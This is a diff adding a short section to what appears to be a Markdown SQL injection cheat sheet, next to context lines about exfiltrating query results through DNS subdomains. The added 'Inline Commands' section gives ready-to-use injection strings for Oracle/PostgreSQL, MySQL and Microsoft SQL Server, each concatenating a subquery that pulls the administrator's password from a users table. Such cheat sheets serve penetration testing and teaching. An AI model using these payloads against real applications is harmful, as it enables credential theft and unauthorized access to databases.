@@ -113,3 +113,17 @@ Prepending any query result to the subdomain, separated with a `.`, allows for s
 Note:
 * The Oracle statement works only on unpatched versions.
 * The MySQL statement is only working on Windows machines
+
+### Inline Commands
+#### Oracle, PostgreSQL
+```
+'||(select password from users where username='administrator')||'
+```
+#### MySQL
+```
+' (select password from users where username='administrator') '
+```
+#### Microsoft
+```
+'+(select password from users where username='administrator')+'
+```
